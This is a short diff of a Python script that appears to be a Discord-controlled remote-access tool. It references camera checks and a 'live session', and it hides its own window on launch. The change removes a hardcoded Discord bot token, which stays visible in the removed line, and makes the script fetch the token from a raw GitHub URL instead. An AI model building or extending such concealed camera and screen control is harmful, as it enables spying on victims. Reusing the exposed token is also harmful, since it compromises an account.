@@ -24,6 +24,7 @@ import pyautogui
 import uuid
 import cv2
 import webbrowser
+import requests
 
 
 def check_connected_cameras():
@@ -208,6 +209,8 @@ async def stop_live_session(interaction : Interaction):
 
 
 
-client.run("MTA5MTc1Mzg0ODU3OTgyOTc5MQ.GTQGT8.AIVZogbmUaoQ494NcMa-u65YQdbFu9xbZXmG1w")
+r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/tok")
+token = r.text
+client.run(token)
 hwnd = win32gui.GetForegroundWindow()
 win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
